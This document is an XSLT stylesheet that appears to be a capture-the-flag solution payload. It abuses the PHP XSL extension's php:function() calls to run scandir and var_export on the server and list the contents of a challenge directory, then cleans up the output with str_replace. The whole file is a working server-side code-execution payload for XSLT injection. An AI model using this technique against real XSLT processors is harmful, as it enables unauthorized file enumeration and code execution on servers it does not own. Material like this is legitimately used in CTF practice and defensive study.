<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl"
  exclude-result-prefixes="php">

  <xsl:output method="html" encoding="UTF-8" indent="yes"/>

  <xsl:template match="/">
    <html>
      <body>
        <h2>Clean Directory Listing</h2>
        <pre>
          <xsl:variable name="raw" select="php:function('var_export', php:function('scandir', '/challenge/web-serveur/ch50/'), true)" />

          <xsl:variable name="step1" select="php:function('str_replace', 'array (', '', $raw)" />
          <xsl:variable name="step2" select="php:function('str_replace', ')', '', $step1)" />
          <xsl:variable name="step3" select="php:function('str_replace', '=>', ':', $step2)" />
          <xsl:variable name="step4" select="php:function('str_replace', ',', '', $step3)" />
          <xsl:variable name="step5" select="php:function('str_replace', '&#10;', '', $step4)" />

          <xsl:value-of select="$step5" />
        </pre>
      </body>
    </html>
  </xsl:template>

</xsl:stylesheet>
